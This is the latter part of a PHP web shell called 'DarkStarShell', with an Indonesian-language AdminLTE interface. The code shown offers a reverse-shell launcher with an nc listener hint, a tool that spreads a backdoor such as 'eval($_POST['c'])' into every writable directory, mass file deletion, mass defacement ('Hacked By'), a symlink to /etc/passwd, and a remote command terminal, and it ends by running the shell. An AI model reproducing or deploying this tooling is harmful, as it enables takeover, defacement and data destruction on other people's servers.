                                            <div class="form-group"><label>Pattern</label><input type="text" class="form-control bg-dark text-light" name="search_pattern" placeholder="e.g., *config* atau admin_pass" required></div>
                                            <div class="form-group"><label>Directory Start</label><input type="text" class="form-control bg-dark text-light" name="search_dir" value="<?php echo htmlspecialchars($this->path); ?>" required></div>
                                            <button type="submit" class="btn btn-secondary btn-block">Search</button>
                                        </form>
                                    </div>
                                </div>
                            </div>

                            <div class="col-md-4">
                                <div class="card card-dark card-outline">
                                    <div class="card-header bg-info"><h3 class="card-title"><i class="fas fa-archive"></i> Compression (Zip/Unzip)</h3></div>
                                    <div class="card-body">
                                        <p class="text-info">Kompres/dekompres file/folder (membutuhkan perintah `zip`/`unzip` di server).</p>
                                        <form method="post" action="?do=compression&path=<?php echo $path_encoded; ?>">
                                            <div class="form-group"><label>Action</label>
                                                <select class="form-control bg-dark text-light" name="comp_action" required>
                                                    <option value="compress">Compress (Zip)</option>
                                                    <option value="decompress">Decompress (Unzip)</option>
                                                </select>
                                            </div>
                                            <div class="form-group"><label>Target File/Dir</label><input type="text" class="form-control bg-dark text-light" name="comp_item" placeholder="e.g., myfolder atau backup.zip" required></div>
                                            <div class="form-group"><label>Output Name (for Compress)</label><input type="text" class="form-control bg-dark text-light" name="comp_output" placeholder="e.g., output.zip (kosongkan untuk default)"></div>
                                            <button type="submit" class="btn btn-info btn-block">Execute</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-4">
                                <div class="card card-dark card-outline">
                                    <div class="card-header bg-danger"><h3 class="card-title"><i class="fas fa-undo-alt"></i> Reverse Shell</h3></div>
                                    <div class="card-body">
                                        <p class="text-danger">Membuat koneksi balik (Reverse Shell) dari server ke listener Anda.</p>
                                        <form method="post" action="?do=reverse_shell&path=<?php echo $path_encoded; ?>">
                                            <div class="form-group"><label>Listener IP (IP Anda)</label><input type="text" class="form-control bg-dark text-light" name="rev_ip" placeholder="e.g., 10.0.0.1" required></div>
                                            <div class="form-group"><label>Listener Port</label><input type="number" class="form-control bg-dark text-light" name="rev_port" value="4444" required></div>
                                            <button type="submit" class="btn btn-danger btn-block" onclick="return confirm('WARNING: Yakin untuk mencoba koneksi balik? Pastikan listener (nc -lvnp 4444) sudah aktif di komputer Anda.')">Start Reverse Shell</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="card card-dark card-outline">
                                    <div class="card-header bg-success"><h3 class="card-title"><i class="fas fa-soap"></i> Sabun Biasa (File Spreader)</h3></div>
                                    <div class="card-body">
                                        <p class="text-success">Menyebarkan satu file (`$namafile`) dan isinya ke direktori saat ini, parent (`..`), dan semua sub-direktori yang *writable*.</p>
                                        <form method="post" action="?do=sabun_biasa&path=<?php echo $path_encoded; ?>">
                                            <div class="form-group"><label>Nama File Target (e.g., `backdoor.php`)</label><input type="text" class="form-control bg-dark text-light" name="namafile" value="panel.php" required></div>
                                            <div class="form-group"><label>Isi Script / Code</label><textarea class="form-control bg-dark text-light" name="isi_script" rows="5" placeholder="<?php echo '<?php eval($_POST[\'c\']); ?>'; ?>" required></textarea></div>
                                            <button type="submit" class="btn btn-success btn-block" onclick="return confirm('WARNING: Are you sure you want to run Sabun Biasa?')">Execute Sabun Biasa</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-4">
                                <div class="card card-dark card-outline">
                                    <div class="card-header bg-danger"><h3 class="card-title"><i class="fas fa-bomb"></i> Mass Delete Tool</h3></div>
                                    <div class="card-body">
                                        <p class="text-danger">Delete files recursively (termasuk sub-folder) dari lokasi saat ini.</p>
                                        <form method="post" action="?do=mass_delete&path=<?php echo $path_encoded; ?>&target=<?php echo $path_encoded; ?>">
                                            <div class="form-group"><label>Path Awal</label><input type="text" class="form-control bg-dark text-light" value="<?php echo htmlspecialchars($this->path); ?>" readonly></div>
                                            <div class="form-group"><label>File Pattern (e.g., `*.html`, `index.*`)</label><input type="text" class="form-control bg-dark text-light" name="pattern" value="*.html" required></div>
                                            <button type="submit" class="btn btn-danger btn-block" onclick="return confirm('WARNING: Are you sure you want to MASS DELETE files?')">Execute Mass Delete</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="card card-dark card-outline">
                                    <div class="card-header bg-warning"><h3 class="card-title"><i class="fas fa-code"></i> Mass Deface Tool</h3></div>
                                    <div class="card-body">
                                        <p class="text-warning">Injeksi konten ke banyak file secara rekursif.</p>
                                        <form method="post" action="?do=mass_deface&path=<?php echo $path_encoded; ?>&target=<?php echo $path_encoded; ?>">
                                            <div class="form-group"><label>File Pattern (e.g., `index.php`, `*.html`)</label><input type="text" class="form-control bg-dark text-light" name="pattern" value="*.html" required></div>
                                            <div class="form-group"><label>Content / Deface Text</label><textarea class="form-control bg-dark text-light" name="content" rows="5" placeholder="<h1>Hacked By <?php echo $this->nick; ?></h1>" required></textarea></div>
                                            <button type="submit" class="btn btn-warning btn-block" onclick="return confirm('WARNING: Are you sure you want to MASS DEFACE files?')">Execute Mass Deface</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="card card-dark card-outline">
                                    <div class="card-header bg-primary"><h3 class="card-title"><i class="fas fa-link"></i> Symlink / Jumping Tool</h3></div>
                                    <div class="card-body">
                                        <p class="text-primary">Buat Symlink (pintasan) ke file/directory penting.</p>
                                        <form method="post" action="?do=symlink&path=<?php echo $path_encoded; ?>">
                                            <div class="form-group"><label>Target File/Dir</label><input type="text" class="form-control bg-dark text-light" name="target" value="/etc/passwd" required></div>
                                            <div class="form-group"><label>Link Name (di folder saat ini)</label><input type="text" class="form-control bg-dark text-light" name="link_name" placeholder="passwd.txt" required></div>
                                            <button type="submit" class="btn btn-primary btn-block">Create Symlink</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="tab-pane" id="system">
                        <div class="card card-dark">
                            <div class="card-header"><h3 class="card-title"><i class="fas fa-info-circle"></i> PHP and System Details</h3></div>
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h5><i class="fas fa-cog text-primary"></i> PHP Info Summary</h5>
                                        <table class="table table-sm table-dark">
                                            <tr><td>PHP Version</td><td><?php echo PHP_VERSION; ?></td></tr>
                                            <tr><td>Time Limit</td><td><?php echo @ini_get('max_execution_time') ?: 'N/A'; ?></td></tr>
                                            <tr><td>Memory Limit</td><td><?php echo @ini_get('memory_limit') ?: 'N/A'; ?></td></tr>
                                            <tr><td>Disabled Functions</td><td><small><?php echo @ini_get('disable_functions') ?: 'None'; ?></small></td></tr>
                                            <tr><td>Safe Mode</td><td><?php echo @ini_get('safe_mode') ? 'ON' : 'OFF'; ?></td></tr>
                                        </table>
                                    </div>
                                    <div class="col-md-6">
                                        <h5><i class="fas fa-server text-info"></i> Server Info</h5>
                                        <table class="table table-sm table-dark">
                                            <tr><td>OS Type</td><td><?php echo @php_uname('s'); ?></td></tr>
                                            <tr><td>Kernel Version</td><td><?php echo @php_uname('r'); ?></td></tr>
                                            <tr><td>Architecture</td><td><?php echo @php_uname('m'); ?></td></tr>
                                            <tr><td>Hostname</td><td><?php echo @php_uname('n'); ?></td></tr>
                                        </table>
                                    </div>
                                    <div class="col-md-12 mt-3">
                                        <h5 class="mb-3"><i class="fas fa-cogs text-danger"></i> Advanced PHP Info</h5>
                                        <a href="?do=phpinfo" target="_blank" class="btn btn-danger btn-block">View Full phpinfo() (New Tab)</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>
    
    <footer class="main-footer text-sm">
        <div class="float-right d-none d-sm-inline-block">
            <b>Template:</b> Admin LTE V3 | <b>Coded By:</b> <?php echo htmlspecialchars($this->nick); ?>
        </div>
        <strong><?php echo $this->panel_title; ?></strong>
    </footer>
</div>

<div class="modal fade" id="uploadModal">
    <div class="modal-dialog"><div class="modal-content bg-dark"><form method="post" action="?do=upload&path=<?php echo $path_encoded; ?>" enctype="multipart/form-data"><div class="modal-header bg-success"><h4 class="modal-title text-white"><i class="fas fa-upload"></i> Upload File</h4><button type="button" class="close text-white" data-dismiss="modal">&times;</button></div><div class="modal-body"><div class="form-group"><label>Select File</label><input type="file" class="form-control-file" name="file" required></div></div><div class="modal-footer"><button type="submit" class="btn btn-success">Upload</button></div></form></div></div>
</div>

<div class="modal fade" id="renameModal">
    <div class="modal-dialog"><div class="modal-content bg-dark"><form method="post" action="?do=rename&path=<?php echo $path_encoded; ?>"><div class="modal-header bg-primary"><h4 class="modal-title text-white"><i class="fas fa-i-cursor"></i> Rename Item</h4><button type="button" class="close text-white" data-dismiss="modal">&times;</button></div><div class="modal-body"><p>Current Item: <strong id="currentNameDisplay"></strong></p><div class="form-group"><label for="newName">New Name</label><input type="text" class="form-control bg-dark text-light" name="new_name" id="newName" required><input type="hidden" name="target" id="renameTarget"></div></div><div class="modal-footer"><button type="submit" class="btn btn-primary">Rename</button></div></form></div></div>
</div>

<div class="modal fade" id="chmodModal">
    <div class="modal-dialog"><div class="modal-content bg-dark"><form method="post" action="?do=chmod&path=<?php echo $path_encoded; ?>"><div class="modal-header bg-secondary"><h4 class="modal-title text-white"><i class="fas fa-key"></i> Change Permissions</h4><button type="button" class="close text-white" data-dismiss="modal">&times;</button></div><div class="modal-body"><p>Item: <strong id="chmodItemName"></strong></p><div class="form-group"><label for="currentPerms">Current Permissions</label><input type="text" class="form-control bg-dark text-light" id="currentPerms" readonly></div><div class="form-group"><label for="newPerms">New Permissions (Octal e.g., 0777)</label><input type="text" class="form-control bg-dark text-light" name="perms" id="newPerms" pattern="[0-7]{3,4}" maxlength="4" required><input type="hidden" name="target" id="chmodTarget"></div></div><div class="modal-footer"><button type="submit" class="btn btn-secondary">Change CHMOD</button></div></form></div></div>
</div>

<div class="modal fade" id="editModal" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog modal-xl"><div class="modal-content bg-dark"><div class="modal-header bg-info"><h4 class="modal-title text-white"><i class="fas fa-file-alt"></i> Editing: <span id="editFileName"></span></h4><button type="button" class="close text-white" data-dismiss="modal" onclick="confirmBeforeClose()">&times;</button></div><div class="modal-body"><textarea id="fileContent" style="width: 100%; min-height: 500px;" class="form-control bg-dark text-light border-info"></textarea><div id="editorStatus" class="mt-2 text-warning">Loading...</div></div><div class="modal-footer"><button type="button" class="btn btn-danger" data-dismiss="modal" onclick="confirmBeforeClose()">Close</button><button type="button" class="btn btn-success" onclick="saveFile()">Save Changes</button></div></div></div>
</div>

<div class="modal fade" id="mkfileModal">
    <div class="modal-dialog"><div class="modal-content bg-dark"><form method="post" action="?path=<?php echo $path_encoded; ?>"><div class="modal-header bg-warning"><h4 class="modal-title text-white"><i class="fas fa-plus"></i> Create New Item</h4><button type="button" class="close text-white" data-dismiss="modal">&times;</button></div><div class="modal-body"><div class="form-group"><label for="newItemName">Name (e.g., `newfile.txt` or `newdir`)</label><input type="text" class="form-control bg-dark text-light" name="new_item_name" placeholder="Filename or Directory name" required></div><div class="form-group"><label for="itemType">Type</label><select class="form-control bg-dark text-light" name="item_type"><option value="file">File</option><option value="dir">Directory</option></select></div></div><div class="modal-footer"><button type="submit" class="btn btn-warning" name="do_create">Create</button></div></form></div></div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/js/adminlte.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
let currentEditTarget = null;
let initialContent = '';

function showNotification(icon, title, text) {
    Swal.fire({ icon: icon, title: title, text: text, toast: true, position: 'top-end', showConfirmButton: false, timer: 3000 });
}

function showRenameModal(targetPath, currentName) {
    const decodedPath = decodeURIComponent(targetPath);
    $('#renameTarget').val(decodedPath);
    $('#currentNameDisplay').text(currentName);
    $('#newName').val(currentName);
    $('#renameModal').modal('show');
}

function showChmodModal(targetPath, itemName, currentPerms) {
    const decodedPath = decodeURIComponent(targetPath);
    $('#chmodTarget').val(decodedPath);
    $('#chmodItemName').text(itemName);
    $('#currentPerms').val(currentPerms);
    $('#newPerms').val(currentPerms);
    $('#chmodModal').modal('show');
}

function showSymlinkModal(target, name) {
    $('#tools a[href="#tools"]').tab('show');
    $('input[name="target"]').val(target);
    $('input[name="link_name"]').val(name);
}

function editFile(targetPath, fileName) {
    currentEditTarget = decodeURIComponent(targetPath);
    $('#editFileName').text(fileName);
    $('#fileContent').val('');
    $('#editorStatus').text('Loading file content...');
    $('#editModal').modal('show');

    fetch(`?do=get_content&target=${targetPath}&is_ajax=1`)
        .then(response => {
            if (!response.ok) { throw new Error(`HTTP error! status: ${response.status}`); }
            return response.text();
        })
        .then(base64Content => {
            if (base64Content.trim().startsWith('<!DOCTYPE html>')) {
                 $('#fileContent').val(`--- CRITICAL ERROR: Output Buffer Leak ---\n\nServer Response (HTML/GUI Code):\n${base64Content}`);
                 $('#editorStatus').text(`CRITICAL ERROR: Output Buffer Leak.`);
                 initialContent = base64Content;
                 return;
            }
            try {
                const decodedContent = atob(base64Content); 
                $('#fileContent').val(decodedContent);
                initialContent = decodedContent; 
                $('#editorStatus').text('Ready. File loaded successfully.');
            } catch (e) {
                $('#fileContent').val(`--- ERROR DECODING BASE64 ---\n\nBase64 Data:\n${base64Content}`);
                initialContent = base64Content;
                $('#editorStatus').text(`Error: Gagal decoding Base64.`);
            }
        })
        .catch(error => {
            $('#editorStatus').text(`Error loading file: ${error.message}`);
            Swal.fire('Error', `Failed to load file content: ${error.message}`, 'error');
        });
}

function saveFile() {
    const rawContent = $('#fileContent').val();
    if (rawContent === initialContent) { showNotification('info', 'No Changes', 'File content is unchanged.'); return; }
    $('#editorStatus').text('Saving changes...');
    
    const encodedContent = btoa(rawContent);

    fetch(`?do=save_content&target=${encodeURIComponent(currentEditTarget)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ content: encodedContent, is_ajax: 1 })
    })
    .then(response => {
        if (!response.ok) { throw new Error('Server returned an error.'); }
        return response.text();
    })
    .then(message => {
        initialContent = rawContent; 
        $('#editorStatus').text('Saved successfully!');
        showNotification('success', 'Success', message);
    })
    .catch(error => {
        $('#editorStatus').text(`Save Failed: ${error.message}`);
        Swal.fire('Error', `Failed to save file: ${error.message}`, 'error');
    });
}

function confirmBeforeClose() {
    const currentContent = $('#fileContent').val();
    if (currentContent !== initialContent) {
        Swal.fire({
            title: 'Unsaved Changes!', text: "You have unsaved changes. Discard them?", icon: 'warning', showCancelButton: true,
            confirmButtonColor: '#d33', cancelButtonColor: '#3085d6', confirmButtonText: 'Yes, discard it!'
        }).then((result) => { if (result.isConfirmed) { $('#editModal').modal('hide'); } });
    } else { $('#editModal').modal('hide'); }
}

function executeCommand(form) {
    const command = document.getElementById('commandInput').value;
    const output = document.getElementById('terminalOutput');
    const url = window.location.href.split('?')[0]; 

    output.textContent += "\n$ " + command + "\n" + "-".repeat(80) + "\n" + "[Executing... Please wait]";
    output.scrollTop = output.scrollHeight;
    
    document.getElementById('commandInput').value = '';

    fetch(`${url}?do=terminal`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ command: command, is_ajax: 1 })
    })
    .then(response => response.text())
    .then(responseText => {
        const newContent = responseText.trim();
        output.textContent = output.textContent.replace("[Executing... Please wait]", newContent);
        output.textContent += "\n" + "-".repeat(80) + "\n";
        output.scrollTop = output.scrollHeight;
    })
    .catch(error => {
        output.textContent += "\n[Execution Error: " + error.message + "]";
        output.scrollTop = output.scrollHeight;
    });

    return false;
}

$(function () {
    // --- Tab Switching Logic ---
    const hash = window.location.hash;
    // Check if the hash matches a nav link
    if (hash && $(`a[href="${hash}"]`).length) { 
        $(`a[href="${hash}"]`).tab('show'); 
    } else {
        // If not, use the PHP logic to determine active tab (e.g., if find_grep_results is set)
        $(`a[href="#<?php echo $active_tab; ?>"]`).tab('show');
    }
    
    $('a[data-toggle="tab"]').on('shown.bs.tab', function (e) { 
        window.location.hash = e.target.hash; 
    });

    // --- Message Logic ---
    const urlParams = new URLSearchParams(window.location.search);
    const successMsg = urlParams.get('msg');
    
    if (successMsg) {
        Swal.fire({ title: 'Action Complete', text: successMsg, icon: 'success' });
        // Clean URL after showing message
        history.replaceState(null, '', window.location.pathname + window.location.search.replace(/([?&])msg=[^&]*/, ''));
    }
});
</script>
</body>
</html>
        <?php
    }

    public function run() {
        if (ob_get_level() == 0) ob_start(); 
        $this->authenticate();
        $this->handleAjax(); 
        $this->handlePostActions();
        $this->renderHTML();
        if (ob_get_level() > 0) ob_end_flush();
    }
}

// Instantiate and run the shell
(new DarkStarShell())->run();
?>
